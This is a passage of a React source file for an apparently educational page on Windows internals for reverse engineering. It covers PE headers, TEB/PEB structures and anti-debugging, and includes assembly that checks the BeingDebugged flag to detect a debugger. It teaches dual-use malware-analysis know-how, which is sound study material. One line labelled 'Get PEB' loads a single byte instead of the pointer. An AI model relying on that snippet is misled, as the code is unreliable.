                "& .MuiLinearProgress-bar": {
                  bgcolor: accent,
                  borderRadius: 3,
                },
              }}
            />
          </Box>

          {/* Navigation List */}
          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": {
                    bgcolor: alpha(accent, 0.1),
                  },
                  transition: "all 0.2s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem", color: activeSection === item.id ? accent : "text.secondary" }}>{item.icon}</ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
                {activeSection === item.id && (
                  <Chip
                    label="Current"
                    size="small"
                    sx={{
                      height: 20,
                      fontSize: "0.65rem",
                      bgcolor: alpha(accent, 0.2),
                      color: accent,
                    }}
                  />
                )}
              </ListItem>
            ))}
          </List>

          <Divider sx={{ my: 2 }} />

          {/* Quick Actions */}
          <Box sx={{ display: "flex", gap: 1 }}>
            <Button
              size="small"
              variant="outlined"
              onClick={scrollToTop}
              startIcon={<KeyboardArrowUpIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Top
            </Button>
            <Button
              size="small"
              variant="outlined"
              onClick={() => scrollToSection("quiz")}
              startIcon={<QuizIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Quiz
            </Button>
          </Box>
        </Box>
      </Drawer>

      {/* Main Layout with Sidebar */}
      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}

        <Box sx={{ flex: 1, minWidth: 0 }}>
          {/* Back Button */}
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />

          {/* Hero Header */}
          <Paper
            sx={{
              p: 4,
              mb: 4,
              borderRadius: 4,
              background: `linear-gradient(135deg, ${alpha("#3b82f6", 0.15)} 0%, ${alpha("#8b5cf6", 0.15)} 50%, ${alpha("#06b6d4", 0.15)} 100%)`,
              border: `1px solid ${alpha("#3b82f6", 0.2)}`,
              position: "relative",
              overflow: "hidden",
            }}
          >
            {/* Decorative background elements */}
            <Box
              sx={{
                position: "absolute",
                top: -50,
                right: -50,
                width: 200,
                height: 200,
                borderRadius: "50%",
                background: `radial-gradient(circle, ${alpha("#3b82f6", 0.1)} 0%, transparent 70%)`,
              }}
            />
            <Box
              sx={{
                position: "absolute",
                bottom: -30,
                left: "30%",
                width: 150,
                height: 150,
                borderRadius: "50%",
                background: `radial-gradient(circle, ${alpha("#8b5cf6", 0.1)} 0%, transparent 70%)`,
              }}
            />

            <Box sx={{ position: "relative", zIndex: 1 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 3 }}>
                <Box
                  sx={{
                    width: 80,
                    height: 80,
                    borderRadius: 3,
                    background: `linear-gradient(135deg, #3b82f6, #8b5cf6)`,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    boxShadow: `0 8px 32px ${alpha("#3b82f6", 0.3)}`,
                  }}
                >
                  <MemoryIcon sx={{ fontSize: 44, color: "white" }} />
                </Box>
                <Box>
                  <Typography variant="h3" sx={{ fontWeight: 800, mb: 0.5 }}>
                    Windows Internals for RE
                  </Typography>
                  <Typography variant="h6" color="text.secondary" sx={{ fontWeight: 400 }}>
                    Deep dive into Windows architecture for reverse engineering
                  </Typography>
                </Box>
              </Box>

              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                <Chip label="Intermediate" sx={{ bgcolor: alpha("#f59e0b", 0.15), color: "#f59e0b", fontWeight: 600 }} />
                <Chip label="PE Format" sx={{ bgcolor: alpha("#3b82f6", 0.15), color: "#3b82f6", fontWeight: 600 }} />
                <Chip label="Process Architecture" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
                <Chip label="Malware Analysis" sx={{ bgcolor: alpha("#ef4444", 0.15), color: "#ef4444", fontWeight: 600 }} />
                <Chip label="Code Injection" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600 }} />
              </Box>
            </Box>
          </Paper>

          {/* Quick Navigation */}
          <Paper
            sx={{
              p: 2,
              mb: 4,
              borderRadius: 3,
              position: "sticky",
              top: 70,
              zIndex: 100,
              backdropFilter: "blur(10px)",
              bgcolor: alpha(theme.palette.background.paper, 0.9),
              border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
              boxShadow: `0 4px 20px ${alpha("#000", 0.1)}`,
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1.5 }}>
              <Chip
                label="← Learning Hub"
                size="small"
                clickable
                onClick={() => navigate("/learn")}
                sx={{
                  fontWeight: 700,
                  fontSize: "0.75rem",
                  bgcolor: alpha(accent, 0.1),
                  color: accent,
                  "&:hover": {
                    bgcolor: alpha(accent, 0.2),
                  },
                }}
              />
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "text.secondary" }}>
                Quick Navigation
              </Typography>
            </Box>
            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
              {[
                { label: "Introduction", id: "intro" },
                { label: "PE Format", id: "pe-format" },
                { label: "TEB/PEB", id: "teb-peb" },
                { label: "API Patterns", id: "api-patterns" },
                { label: "Hooking", id: "hooking" },
                { label: "Code Injection", id: "injection" },
                { label: "Anti-Debug", id: "anti-debug" },
                { label: "RE Tools", id: "tools" },
                { label: "Quiz", id: "quiz" },
              ].map((nav) => (
                <Chip
                  key={nav.id}
                  label={nav.label}
                  size="small"
                  clickable
                  onClick={() => scrollToSection(nav.id)}
                  sx={{
                    fontWeight: 600,
                    fontSize: "0.75rem",
                    "&:hover": {
                      bgcolor: alpha(accent, 0.15),
                      color: accent,
                    },
                  }}
                />
              ))}
            </Box>
          </Paper>

          {/* Comprehensive Introduction Section */}
          <Paper id="intro" sx={{ p: 4, mb: 4, borderRadius: 3, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.15)}`, scrollMarginTop: "180px" }}>
          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            🔬 What is Windows Internals for Reverse Engineering?
          </Typography>

          <Typography variant="body1" sx={{ fontSize: "1.1rem", lineHeight: 1.9, mb: 2 }}>
            <strong>Windows Internals</strong> refers to the deep technical knowledge of how the Windows operating system 
            actually works under the hood — the data structures, algorithms, and mechanisms that make everything from running 
            programs to displaying windows possible. For reverse engineers, this knowledge is absolutely essential because 
            most malware targets Windows, most commercial software runs on Windows, and understanding the OS internals lets 
            you comprehend what programs are actually doing when they interact with the system.
          </Typography>

          <Typography variant="body1" sx={{ fontSize: "1.1rem", lineHeight: 1.9, mb: 2 }}>
            <strong>Why does this matter for security research?</strong> When you analyze a program in a disassembler or 
            debugger, you'll see calls to Windows API functions like <code>CreateFile</code>, <code>VirtualAlloc</code>, 
            or <code>CreateRemoteThread</code>. Without understanding what these functions actually do at the OS level, 
            you're just seeing names. With Windows internals knowledge, you understand that <code>CreateRemoteThread</code> 
            creates a thread in another process — a technique commonly used for code injection by both legitimate software 
            and malware. You understand that <code>VirtualAlloc</code> with certain flags can allocate executable memory, 
            a prerequisite for shellcode execution.
          </Typography>

          <Typography variant="body1" sx={{ fontSize: "1.1rem", lineHeight: 1.9, mb: 2 }}>
            <strong>The PE (Portable Executable) format</strong> is where it all begins. Every .exe, .dll, and .sys file on 
            Windows follows this format. The PE header contains critical information: where the program's code starts 
            (AddressOfEntryPoint), which DLLs it needs (Import Table), what functions it exports (Export Table), and memory 
            layout instructions for the loader. Malware authors often manipulate PE headers to evade detection — understanding 
            this format lets you spot anomalies like sections with both write and execute permissions (suspicious), unusually 
            high entropy (possibly packed), or imports loaded at runtime to hide capabilities.
          </Typography>

          <Typography variant="body1" sx={{ fontSize: "1.1rem", lineHeight: 1.9, mb: 2 }}>
            <strong>Process architecture</strong> is equally crucial. Every Windows process has key data structures: the 
            <em>Process Environment Block (PEB)</em> contains information about loaded modules and process parameters that 
            malware frequently queries; the <em>Thread Environment Block (TEB)</em> holds thread-specific data including the 
            stack base and structured exception handling chain. Malware often walks these structures to find loaded DLLs 
            (avoiding detectable API calls), enumerate modules, or detect debuggers. Understanding PEB/TEB walking is 
            essential for analyzing stealthy malware.
          </Typography>

          <Typography variant="body1" sx={{ fontSize: "1.1rem", lineHeight: 1.9, mb: 3 }}>
            <strong>Code injection techniques</strong> are a cornerstone of both offensive security and malware analysis. 
            From classic DLL injection using <code>CreateRemoteThread</code>, to process hollowing that spawns a suspended 
            process and replaces its memory, to sophisticated techniques like Early Bird injection that executes before 
            security tools load — each technique leaves specific artifacts and requires different detection strategies. 
            This guide covers the most important techniques with practical examples and detection approaches.
          </Typography>

          <Divider sx={{ my: 3 }} />

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            📚 What You'll Learn in This Guide
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { title: "PE File Format", desc: "Headers, sections, imports/exports, and how the Windows loader uses this information", icon: <StorageIcon />, color: "#3b82f6" },
              { title: "Process Architecture", desc: "TEB, PEB, loaded module lists, and how processes are represented in memory", icon: <AccountTreeIcon />, color: "#8b5cf6" },
              { title: "Windows APIs for RE", desc: "Critical API patterns for file I/O, networking, registry, process manipulation", icon: <CodeIcon />, color: "#10b981" },
              { title: "DLL Injection Techniques", desc: "CreateRemoteThread, Process Hollowing, APC Injection, and how to detect them", icon: <BugReportIcon />, color: "#ef4444" },
              { title: "API Hooking", desc: "IAT hooks, inline hooks, and how malware intercepts API calls", icon: <LayersIcon />, color: "#f59e0b" },
              { title: "Anti-Debugging", desc: "Common techniques programs use to detect debuggers and how to bypass them", icon: <LockIcon />, color: "#ec4899" },
            ].map((item) => (
              <Grid item xs={12} sm={6} md={4} key={item.title}>
                <Paper sx={{ p: 2, bgcolor: alpha(item.color, 0.08), borderRadius: 2, border: `1px solid ${alpha(item.color, 0.2)}`, height: "100%" }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Box sx={{ color: item.color }}>{item.icon}</Box>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: item.color }}>{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" sx={{ color: "text.secondary" }}>{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info">
            <AlertTitle sx={{ fontWeight: 700 }}>For Beginners</AlertTitle>
            If you're new to Windows internals, start with the PE Format tab to understand how executables are structured, 
            then move to TEB/PEB to see how processes work. Don't try to memorize everything — use this as a reference 
            while you analyze real programs. The best way to learn is hands-on: load a program in a debugger, examine its 
            PEB, walk the loaded module list, and see these concepts in action.
          </Alert>

          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mt: 3 }}>
            <Chip icon={<StorageIcon />} label="PE Format" color="primary" variant="outlined" />
            <Chip icon={<AccountTreeIcon />} label="TEB/PEB" color="secondary" variant="outlined" />
            <Chip icon={<CodeIcon />} label="API Patterns" variant="outlined" />
            <Chip icon={<BugReportIcon />} label="Injection" color="error" variant="outlined" />
            <Chip icon={<SecurityIcon />} label="Anti-Debug" color="warning" variant="outlined" />
          </Box>
        </Paper>

            {/* Section: PE Format */}
            <Box id="pe-format" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">PE File Format</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The <strong>Portable Executable (PE) format</strong> is the foundational file format for all executable code on 
              Windows systems, including applications (.exe), dynamic link libraries (.dll), kernel-mode drivers (.sys), and 
              even screensavers (.scr). Introduced with Windows NT in 1993, the PE format evolved from the earlier Common Object 
              File Format (COFF) used in Unix systems, adapting it for the Windows environment while maintaining compatibility 
              with older DOS executables through the inclusion of a DOS stub header.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              For reverse engineers and malware analysts, deep knowledge of the PE format is absolutely critical. Every binary 
              you analyze will be a PE file, and the header structures contain a wealth of information about the program's 
              behavior, dependencies, and potential malicious indicators. The PE header tells you where code execution begins 
              (the entry point), which external libraries and functions the program depends on (imports), what functionality 
              it exposes to other programs (exports), and how the operating system should load it into memory.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The PE format is hierarchical in nature. At the very beginning is the DOS header, a 64-byte structure that starts 
              with the famous "MZ" signature (0x5A4D, representing the initials of Mark Zbikowski, one of the original DOS 
              architects). This header exists purely for backward compatibility — if you try to run a modern Windows executable 
              under DOS, the DOS stub (which follows the DOS header) will execute and display "This program cannot be run in DOS 
              mode." The crucial field in the DOS header is <code>e_lfanew</code> at offset 0x3C, which contains a pointer to 
              the actual PE headers.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The NT Headers structure is where the real PE information resides. It begins with the PE signature ("PE\0\0"), 
              followed by the File Header containing machine type (x86 or x64), number of sections, timestamp, and characteristics 
              flags. The Optional Header (which is not optional for executables) contains the most critical reverse engineering 
              information: the entry point address, image base (the preferred load address), section and file alignment values, 
              subsystem type (GUI or Console), DLL characteristics (including security features like ASLR and DEP), and most 
              importantly, the Data Directories array — 16 entries pointing to crucial structures like imports, exports, 
              resources, relocations, TLS callbacks, debug information, and more.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              When the Windows loader executes a PE file, it reads the headers to understand how to set up the process. It 
              allocates virtual memory based on <code>SizeOfImage</code>, maps each section to its specified virtual address 
              with the appropriate memory protections (read, write, execute), processes relocations if the image couldn't load 
              at its preferred base address (due to ASLR or conflicts), resolves all imported functions by loading required 
              DLLs and filling in the Import Address Table (IAT), runs any TLS callbacks (often abused by malware for 
              anti-debugging), and finally transfers execution to the entry point address.
            </Typography>

            <Alert severity="info" sx={{ mb: 3 }}>
              <AlertTitle>Key Concepts</AlertTitle>
              <strong>RVA (Relative Virtual Address)</strong>: Offset from ImageBase when loaded in memory. Most addresses in PE headers are RVAs.<br/>
              <strong>VA (Virtual Address)</strong>: Actual address in process memory, calculated as ImageBase + RVA. This is what you see in debuggers.<br/>
              <strong>File Offset</strong>: Offset in the file on disk. Section headers contain both RVA and file offsets — use them to convert between the two.<br/>
              <strong>Raw vs Virtual Size</strong>: Raw size is the data in the file; virtual size is the memory allocation. If virtual &gt; raw, extra space is zero-filled (BSS data).
            </Alert>

            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">PE Header Structure Overview</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Grid container spacing={2}>
                  {[
                    { title: "DOS Header (IMAGE_DOS_HEADER)", desc: "64-byte legacy header starting with 'MZ' (0x5A4D). The e_lfanew field at offset 0x3C points to NT Headers.", icon: <StorageIcon /> },
                    { title: "DOS Stub", desc: "Optional MS-DOS program that prints 'This program cannot be run in DOS mode.' Can contain hidden code.", icon: <CodeIcon /> },
                    { title: "NT Headers (IMAGE_NT_HEADERS)", desc: "Main PE header: Signature ('PE\\0\\0'), FileHeader (machine, sections count), OptionalHeader (entry point, image base, subsystem).", icon: <SettingsIcon /> },
                    { title: "Section Headers", desc: "Array of IMAGE_SECTION_HEADER structures. Each describes a section's name, virtual/raw sizes, RVA, and characteristics.", icon: <FolderIcon /> },
                    { title: "Data Directories", desc: "16-entry array in OptionalHeader pointing to imports, exports, resources, relocations, TLS, debug info, etc.", icon: <AccountTreeIcon /> },
                    { title: "Sections", desc: "Actual code (.text), data (.data, .rdata), resources (.rsrc), and relocations (.reloc). PE loader maps these to memory.", icon: <LayersIcon /> },
                  ].map((item) => (
                    <Grid item xs={12} md={6} key={item.title}>
                      <Card variant="outlined" sx={{ height: "100%" }}>
                        <CardContent>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                            {item.icon}
                            <Typography variant="subtitle1" fontWeight="bold" color="primary">{item.title}</Typography>
                          </Box>
                          <Typography variant="body2">{item.desc}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>

                <CodeBlock title="PE Header Layout & Key Offsets">{`┌─────────────────────────────────────────────────────────┐
│ DOS Header (64 bytes)                                   │
│   0x00: e_magic = 0x5A4D ('MZ')                        │
│   0x3C: e_lfanew = offset to NT Headers                │
├─────────────────────────────────────────────────────────┤
│ DOS Stub (variable size, optional)                     │
├─────────────────────────────────────────────────────────┤
│ NT Headers (IMAGE_NT_HEADERS)                          │
│   +0x00: Signature = 0x00004550 ('PE\\0\\0')           │
│   +0x04: FileHeader (20 bytes)                         │
│          - Machine: 0x014C (x86), 0x8664 (x64)         │
│          - NumberOfSections                            │
│          - TimeDateStamp (compilation time)            │
│          - SizeOfOptionalHeader                        │
│          - Characteristics (EXE, DLL, etc.)            │
│   +0x18: OptionalHeader (x86: 224 bytes, x64: 240)     │
│          - Magic: 0x10B (PE32), 0x20B (PE32+)          │
│          - AddressOfEntryPoint (RVA)                   │
│          - ImageBase (preferred load address)          │
│          - SectionAlignment (memory), FileAlignment    │
│          - SizeOfImage, SizeOfHeaders                  │
│          - Subsystem: 2=GUI, 3=Console                 │
│          - DllCharacteristics (ASLR, DEP, CFG flags)   │
│          - DataDirectory[16] array                     │
├─────────────────────────────────────────────────────────┤
│ Section Headers (40 bytes each × NumberOfSections)     │
│   - Name[8], VirtualSize, VirtualAddress (RVA)        │
│   - SizeOfRawData, PointerToRawData (file offset)     │
│   - Characteristics (R/W/X permissions)                │
├─────────────────────────────────────────────────────────┤
│ .text section (code)                                   │
│ .rdata section (read-only data, imports)              │
│ .data section (initialized data)                       │
│ .rsrc section (resources)                              │
│ .reloc section (relocations for ASLR)                 │
└─────────────────────────────────────────────────────────┘`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Common PE Sections (Detailed)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                        <TableCell><strong>Section</strong></TableCell>
                        <TableCell><strong>Purpose</strong></TableCell>
                        <TableCell><strong>RE Notes</strong></TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {peSections.map((s) => (
                        <TableRow key={s.name}>
                          <TableCell><code style={{ fontWeight: "bold" }}>{s.name}</code></TableCell>
                          <TableCell>{s.purpose}</TableCell>
                          <TableCell><Typography variant="caption" color="text.secondary">{s.notes}</Typography></TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>

                <Alert severity="warning" sx={{ mt: 2 }}>
                  <AlertTitle>Red Flags in Sections</AlertTitle>
                  • <strong>RWX permissions</strong>: Writable AND executable is suspicious (self-modifying code, shellcode)<br/>
                  • <strong>Unusual names</strong>: UPX0, .enigma, .vmp0 indicate packers/protectors<br/>
                  • <strong>High entropy</strong>: Encrypted/compressed data in sections<br/>
                  • <strong>.text with raw size ≠ virtual size</strong>: May unpack at runtime
                </Alert>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Data Directories (All 16 Entries)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="info" sx={{ mb: 2 }}>
                  <AlertTitle>IAT vs EAT Resolution</AlertTitle>
                  <strong>Import Resolution</strong>: Loader walks Import Directory → finds DLL names → loads DLLs → resolves function addresses → writes to IAT.<br/>
                  <strong>Export Resolution</strong>: GetProcAddress walks EAT → finds function name/ordinal → returns function RVA + DllBase.
                </Alert>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                        <TableCell><strong>#</strong></TableCell>
                        <TableCell><strong>Directory</strong></TableCell>
                        <TableCell><strong>Description</strong></TableCell>
                        <TableCell><strong>RE Use Case</strong></TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {peDirectories.map((d) => (
                        <TableRow key={d.index}>
                          <TableCell>{d.index}</TableCell>
                          <TableCell><strong>{d.name}</strong></TableCell>
                          <TableCell>{d.description}</TableCell>
                          <TableCell><Typography variant="caption" color="primary">{d.useCase}</Typography></TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>

                <CodeBlock title="Import Table Structure">{`IMAGE_IMPORT_DESCRIPTOR (one per imported DLL):
  OriginalFirstThunk  → RVA to Import Name Table (INT) - hints/names
  TimeDateStamp       → 0 or -1 for bound imports
  ForwarderChain      → Index of first forwarder reference
  Name                → RVA to DLL name string (e.g., "KERNEL32.dll")
  FirstThunk          → RVA to Import Address Table (IAT) - resolved addresses

Import Resolution Flow:
1. Loader reads IMAGE_IMPORT_DESCRIPTOR for each DLL
2. LoadLibrary(Name) to get DLL base address
3. For each entry in OriginalFirstThunk (INT):
   - If high bit set: import by ordinal
   - Otherwise: IMAGE_IMPORT_BY_NAME (Hint + Name)
4. GetProcAddress resolves each function
5. Write resolved addresses to FirstThunk (IAT)

After loading, IAT contains actual function addresses:
  call [IAT_entry]  ; indirect call to imported function`}</CodeBlock>

                <CodeBlock title="Export Table Structure">{`IMAGE_EXPORT_DIRECTORY:
  Characteristics     → Reserved (0)
  TimeDateStamp       → Export creation time
  MajorVersion/Minor  → Version numbers
  Name                → RVA to DLL name
  Base                → Starting ordinal number
  NumberOfFunctions   → Total exported functions
  NumberOfNames       → Functions exported by name
  AddressOfFunctions  → RVA to Export Address Table (EAT)
  AddressOfNames      → RVA to array of name RVAs
  AddressOfNameOrdinals → RVA to array of ordinal indices

Export Resolution (GetProcAddress):
1. If ordinal: index = ordinal - Base
2. If name: binary search AddressOfNames, get ordinal from AddressOfNameOrdinals
3. Read EAT[index] for function RVA
4. If RVA is within export section: it's a forwarder string (e.g., "NTDLL.RtlAllocateHeap")
5. Return ImageBase + RVA`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Security Features (DllCharacteristics)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Grid container spacing={2}>
                  {[
                    { flag: "DYNAMIC_BASE (0x0040)", name: "ASLR", desc: "Address Space Layout Randomization - randomizes ImageBase" },
                    { flag: "NX_COMPAT (0x0100)", name: "DEP/NX", desc: "Data Execution Prevention - non-executable stack/heap" },
                    { flag: "NO_SEH (0x0400)", name: "No SEH", desc: "No Structured Exception Handling used" },
                    { flag: "GUARD_CF (0x4000)", name: "CFG", desc: "Control Flow Guard - validates indirect call targets" },
                    { flag: "HIGH_ENTROPY_VA (0x0020)", name: "High Entropy ASLR", desc: "64-bit address space randomization" },
                    { flag: "FORCE_INTEGRITY (0x0080)", name: "Mandatory Signing", desc: "Code integrity checks required" },
                  ].map((f) => (
                    <Grid item xs={12} md={6} key={f.flag}>
                      <Card variant="outlined">
                        <CardContent>
                          <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                            <Typography variant="subtitle2" fontWeight="bold" color="primary">{f.name}</Typography>
                            <Chip label={f.flag} size="small" sx={{ fontFamily: "monospace" }} />
                          </Box>
                          <Typography variant="body2">{f.desc}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: TEB/PEB */}
            <Box id="teb-peb" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Process & Thread Environment</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              At the heart of every Windows process lies a complex web of data structures that the operating system uses to 
              manage execution state, track loaded libraries, and maintain thread-specific information. The two most critical 
              structures for reverse engineers are the <strong>Process Environment Block (PEB)</strong> and the <strong>Thread 
              Environment Block (TEB)</strong>. While Microsoft considers these structures "undocumented" (meaning they can change 
              between Windows versions), they are extensively used by both legitimate software and malware, making them essential 
              knowledge for anyone analyzing Windows binaries.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The <strong>PEB</strong> is a process-wide structure that exists once per process and contains fundamental information 
              about the running program. It holds the image base address (where the executable is loaded in memory), a pointer to 
              the loaded modules list (PEB_LDR_DATA, which tracks all DLLs in the process), the process heap handle, process 
              parameters (including the command line, current directory, and environment variables), and critically important 
              flags used for debugging detection. The <code>BeingDebugged</code> flag at offset 0x02 is the single most commonly 
              checked anti-debugging indicator — when a debugger attaches, Windows sets this flag to 1, and malware frequently 
              checks it to detect analysis environments.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The <strong>TEB</strong> (also called the Thread Information Block or TIB) exists once per thread and contains 
              thread-specific data. Each thread gets its own TEB, accessible through the FS segment register on 32-bit Windows 
              or the GS segment register on 64-bit Windows. The TEB contains the thread's stack boundaries (base and limit), 
              the Structured Exception Handling (SEH) chain on 32-bit systems, thread-local storage (TLS) data, the last error 
              value (set by GetLastError), and a pointer back to the parent process's PEB. The TEB is always at FS:[0] or GS:[0], 
              making it trivially accessible from any code running in the thread.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Why do these structures matter for reverse engineering?</strong> Shellcode commonly uses PEB walking to 
              find loaded DLLs and resolve API addresses without calling GetProcAddress (which would be visible to API monitors). 
              By walking the InMemoryOrderModuleList in PEB_LDR_DATA, shellcode can locate kernel32.dll's base address, then 
              parse its export table to find functions like LoadLibrary and GetProcAddress. This technique, known as "PEB walking," 
              is a hallmark of position-independent shellcode and is essential to understand for malware analysis.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              Anti-debugging techniques heavily rely on PEB and TEB fields. Beyond the obvious BeingDebugged flag, the 
              <code>NtGlobalFlag</code> field changes when a process is created under a debugger (it gets heap debugging flags 
              set), the process heap itself has different flags when debugging, and even the <code>ProcessParameters</code> 
              structure can be inspected for debugger-related artifacts. Security researchers and malware analysts must understand 
              these structures to both implement and bypass anti-debugging techniques. WinDbg commands like <code>!peb</code> and 
              <code>!teb</code> provide easy access to view these structures during debugging sessions.
            </Typography>

            <Alert severity="warning" sx={{ mb: 3 }}>
              <AlertTitle>Accessing TEB/PEB</AlertTitle>
              <Box component="span" sx={{ display: "block", mb: 1 }}>
                <strong>x86:</strong> TEB at <code>FS:[0x00]</code>, PEB at <code>FS:[0x30]</code><br/>
                <strong>x64:</strong> TEB at <code>GS:[0x00]</code>, PEB at <code>GS:[0x60]</code>
              </Box>
              <Typography variant="body2">
                The FS/GS segment registers point to the TEB. The PEB is accessed via the TEB's ProcessEnvironmentBlock field.
                In 64-bit Windows, FS is used for WoW64 (32-bit) compatibility while GS is used for native 64-bit.
              </Typography>
            </Alert>

            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">PEB Structure (Process Environment Block)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph>
                  The PEB contains process-wide information including the image base, loaded modules list, heap handle,
                  process parameters (command line, environment), and various flags used for anti-debugging detection.
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                        <TableCell><strong>x86</strong></TableCell>
                        <TableCell><strong>x64</strong></TableCell>
                        <TableCell><strong>Field</strong></TableCell>
                        <TableCell><strong>Type</strong></TableCell>
                        <TableCell><strong>Description</strong></TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {pebFields.map((f) => (
                        <TableRow key={f.offset} sx={{ bgcolor: f.field === "BeingDebugged" || f.field === "NtGlobalFlag" ? alpha(theme.palette.warning.main, 0.1) : "inherit" }}>
                          <TableCell><code>{f.offset}</code></TableCell>
                          <TableCell><code>{f.offset64}</code></TableCell>
                          <TableCell><strong>{f.field}</strong></TableCell>
                          <TableCell><Typography variant="caption" sx={{ fontFamily: "monospace" }}>{f.type}</Typography></TableCell>
                          <TableCell>{f.description}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
                <CodeBlock title="Access PEB in Assembly (x86 & x64)">{`; ===== x86 Assembly =====
; Get PEB pointer via FS segment
mov eax, fs:[0x30]        ; EAX = PEB pointer

; Check if being debugged (anti-debug)
movzx eax, byte ptr fs:[0x30]  ; Get PEB
movzx eax, byte ptr [eax+0x02] ; BeingDebugged flag
test al, al
jnz debugger_detected

; Get ImageBase
mov eax, fs:[0x30]
mov eax, [eax + 0x08]     ; ImageBaseAddress

; Get Ldr (loaded modules)
mov eax, fs:[0x30]
mov eax, [eax + 0x0C]     ; PEB->Ldr (PEB_LDR_DATA)

